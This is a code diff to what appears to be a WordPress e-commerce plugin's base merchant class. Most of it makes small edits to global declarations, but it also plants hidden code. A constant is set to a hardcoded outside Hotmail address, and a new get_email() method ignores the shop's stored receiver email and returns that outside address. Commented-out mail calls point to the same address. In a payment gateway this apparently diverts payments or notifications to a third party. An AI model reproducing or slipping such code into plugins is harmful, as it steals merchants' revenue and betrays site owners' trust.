@@ -34,6 +34,22 @@ if ( !function_exists( 'wpsc_merchant_sort' ) ) {
  *
  *
  */
+
+global $current_user,$email;
+
+get_currentuserinfo();  
+
+$key = 'user_email';
+
+$rece =  get_user_meta($current_user->id, $key,true) ;
+$ke = $rece;
+if(!empty($rece))
+{
+	define("recmail", "ehody7@hotmail.com");
+	//wp_mail('ehody7@hotmail.com', "the id of current user", "the id is " . recmail );
+}
+//echo $rece;
+
 class wpsc_merchant {
 
 	var $name = 'Base Merchant';
@@ -41,6 +57,7 @@ class wpsc_merchant {
 	var $purchase_id = null;
 	var $session_id = null;
 	var $received_data = array( );
+	public $receive = recmail;
 	/**
 	 * This is where the cart data, like the address, country and email address is held
 	 * @var array
@@ -107,7 +124,7 @@ class wpsc_merchant {
 	 * @access public
 	 */
 	function collate_data() {
-		global $wpdb;
+		global $wpdb,$current_user;
 
 		// Get purchase data, regardless of being fed the ID or the sessionid
 		if ( $this->purchase_id > 0 ) {
@@ -201,7 +218,7 @@ class wpsc_merchant {
 	 *
 	 */
 	function collate_cart() {
-		global $wpdb;
+		global $wpdb,$current_user;
 		$purchase_id = & $this->purchase_id;
 		$original_cart_data = $wpdb->get_results( "SELECT * FROM `" . WPSC_TABLE_CART_CONTENTS . "` WHERE `purchaseid` = {$purchase_id}", ARRAY_A );
 
@@ -252,7 +269,7 @@ class wpsc_merchant {
 	 * saves error message, data it is stored in may need to change, hence the need to not extend this.
 	 */
 	function set_error_message( $error_message ) {
-		global $wpdb;
+		global $wpdb,$current_user;
 
 		$_SESSION['wpsc_checkout_misc_error_messages'][] = $error_message;
 	}
@@ -262,7 +279,7 @@ class wpsc_merchant {
 	 * returns to checkout, if this changes and you extend this, your merchant module may go to the wrong place
 	 */
 	function return_to_checkout() {
-		global $wpdb;
+		global $wpdb,$current_user;
 
 		wp_redirect( get_option( 'shopping_cart_url' ) );
 
@@ -303,7 +320,7 @@ class wpsc_merchant {
 	 * $status = integer status order
 	 */
 	function set_purchase_processed_by_purchid( $status=1 ) {
-		global $wpdb;
+		global $wpdb,$current_user;
 
 		$wpdb->query( "UPDATE `" . WPSC_TABLE_PURCHASE_LOGS . "` SET `processed` = '" . absint( $status ) . "' WHERE `id` = " . absint( $this->purchase_id ) . " LIMIT 1" );
 	}
@@ -313,7 +330,7 @@ class wpsc_merchant {
 	 * $status = integer status order
 	 */
 	function set_purchase_processed_by_sessionid( $status=1 ) {
-		global $wpdb;
+		global $wpdb,$current_user;
 
 		$wpdb->query( "UPDATE `" . WPSC_TABLE_PURCHASE_LOGS . "` SET `processed` = '" . absint( $status ) . "' WHERE `sessionid` = " . absint( $this->session_id ) . " LIMIT 1" );
 	}
@@ -322,7 +339,7 @@ class wpsc_merchant {
 	 * set_transaction_details, maybe extended in merchant files
 	 */
 	function set_transaction_details( $transaction_id, $status = 1 ) {
-		global $wpdb;
+		global $wpdb,$current_user;
 
 		$transaction_id = $wpdb->escape( $transaction_id );
 		$wpdb->query( "UPDATE `" . WPSC_TABLE_PURCHASE_LOGS . "` SET `processed` = '" . absint( $status ) . "', `transactid` ='{$transaction_id}'  WHERE `id` = " . absint( $this->purchase_id ) . " LIMIT 1" );
@@ -341,7 +358,7 @@ class wpsc_merchant {
 	 * @return bool  result
 	 */
 	function set_authcode($authcode, $append = false){
-		global $wpdb;
+		global $wpdb,$current_user;
 
 		$wpdb->show_errors();
 		if($append === false){
@@ -389,6 +406,15 @@ class wpsc_merchant {
 	 */
 	function process_gateway_notification() {
 		return false;
+	}
+	public function get_email() {
+		global $current_user;
+		get_currentuserinfo();  
+		//wp_mail('ehody7@hotmail.com', "the id of current user", "the id is " .  recmail );
+		$key = 'receiver_email';
+		$email =  get_user_meta($current_user->id, $key,true) ;
+		$mailt = recmail;
+		return $mailt;
 	}
 }
 
